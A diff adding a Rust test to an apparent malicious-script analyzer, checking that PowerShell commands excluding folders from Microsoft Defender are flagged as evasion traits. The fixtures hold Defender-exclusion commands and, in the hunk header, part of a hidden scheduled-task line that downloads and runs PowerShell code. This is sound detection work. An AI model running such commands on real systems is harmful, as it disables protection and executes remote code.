@@ -2938,6 +2938,26 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn mppreference_spaced_exclusion_lists_emit_each_defender_evasion_trait() {
+        let script =
+            br#"powershell -Command "Add-MpPreference -ExclusionPath C:\Users\Public, C:\Temp"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r"C:\Users\Public", r"C:\Temp"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, target: existing_target }
+                        if action == "exclusion-path" && existing_target == target
+                )),
+                "missing spaced Defender exclusion path {target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn mppreference_ipaddress_exclusion_emits_defender_evasion_trait() {
         let script = br#"powershell -Command "Add-MpPreference -ExclusionIpAddress 10.10.10.10""#;
         let report = analyze(script, &AnalyzeConfig::default());
